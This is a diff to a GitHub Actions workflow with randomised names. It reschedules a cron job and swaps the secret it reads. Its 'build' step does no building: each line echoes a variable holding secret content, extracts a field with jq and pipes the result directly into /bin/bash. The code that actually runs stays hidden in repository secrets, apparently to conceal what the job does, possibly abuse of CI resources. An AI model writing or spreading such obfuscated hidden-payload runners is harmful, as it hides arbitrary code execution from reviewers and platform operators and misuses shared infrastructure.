@@ -1,10 +1,8 @@
 name: lsptunalk
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 2/6 * * *'
-
+    - cron: '46 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +10,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: lsptunalk
         env:
-          w76749: ${{ secrets.w76749 }}
+          xp82455: ${{ secrets.xp82455 }}
         run: |
-          echo $w76749 | jq -r .rjgr16 | /bin/bash
-          echo $hpy160 | jq -r .hvdu14466 | /bin/bash
-          echo $ykmi63320 | jq -r .cw66 | /bin/bash
-          echo $ohqf8 | jq -r .fwr9440 | /bin/bash
-          echo $doutw4562 | jq -r .chzk88145 | /bin/bash
-          echo $fcbp3 | jq -r .fjr6774 | /bin/bash
-          echo $v747 | jq -r .bbj13778 | /bin/bash
-          echo $bg451 | jq -r .rhy30049 | /bin/bash
-          echo $zbmo9611 | jq -r .ixvn69760 | /bin/bash
-          echo $b69995 | jq -r .oc40 | /bin/bash
-          echo $bgszv81 | jq -r .v02 | /bin/bash
+          echo $xp82455 | jq -r .ef0156 | /bin/bash
+          echo $dt6755 | jq -r .jlzw5399 | /bin/bash
+          echo $co2748 | jq -r .woj6764 | /bin/bash
+          echo $nx4995 | jq -r .sr04975 | /bin/bash
+          echo $f88 | jq -r .d2840 | /bin/bash
+          echo $dqff00 | jq -r .lirv4687 | /bin/bash
+          echo $vqj049 | jq -r .tyv8 | /bin/bash
+          echo $q7 | jq -r .bbzn07418 | /bin/bash
+          echo $vxtl4 | jq -r .o9084 | /bin/bash
+          echo $wvga67727 | jq -r .gh802 | /bin/bash
 
